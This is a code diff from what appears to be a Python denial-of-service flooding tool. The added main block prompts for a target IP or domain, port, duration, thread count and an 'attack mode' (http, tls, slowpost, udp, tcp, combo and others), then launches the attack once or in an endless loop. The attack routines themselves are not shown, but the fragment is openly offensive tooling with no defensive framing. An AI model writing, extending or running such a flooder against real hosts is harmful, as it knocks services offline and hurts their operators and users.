@@ -221,4 +221,20 @@ def run_mode(mode, ip, port, duration, threads):
         print("Invalid mode.")
 
 if __name__ == "__main__":
-    parse_trigger(sys.argv)
+    ip = input("Enter target IP or domain: ").strip()
+    port = int(input("Enter port: ").strip())
+    duration = int(input("Enter duration (seconds): ").strip())
+    threads = int(input("Enter number of threads: ").strip())
+    mode = input("Enter attack mode (http/tls/head/ws/udp/tcp/slowpost/combo): ").strip().lower()
+    loop = input("Loop attack? (y/n): ").strip().lower() == "y"
+
+    if loop:
+        print("[∞] Loop mode ON. Press Ctrl+C to stop.\n")
+        try:
+            while True:
+                run_mode(mode, ip, port, duration, threads)
+        except KeyboardInterrupt:
+            print("\n[✘] Loop stopped by user.")
+    else:
+        run_mode(mode, ip, port, duration, threads)
+
